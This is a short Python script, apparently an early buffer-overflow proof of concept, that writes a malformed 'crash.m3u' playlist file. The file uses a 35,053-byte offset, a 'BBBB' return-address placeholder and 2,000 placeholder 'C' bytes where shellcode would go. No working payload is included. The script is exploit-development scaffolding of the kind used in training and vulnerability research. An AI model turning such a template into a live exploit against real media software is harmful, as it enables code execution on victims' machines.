# wetw0rk

file = "crash.m3u"

offset = b"A" * 35053
retAddr = b"BBBB"
shellcode = b"C" * 2000

final_buffer_size = 50000

junk = b"D" * (final_buffer_size - (len(offset) +
                                    len(retAddr) +
                                    len(shellcode)))

payload = offset + retAddr + shellcode + junk

print(f"[*] Buffer size: {len(payload)}")
print(f"[*] Writing exploit to {file}")
fp = open(file, "wb")
fp.write(payload)
fp.close()

print("[+] m3u file created successfully")
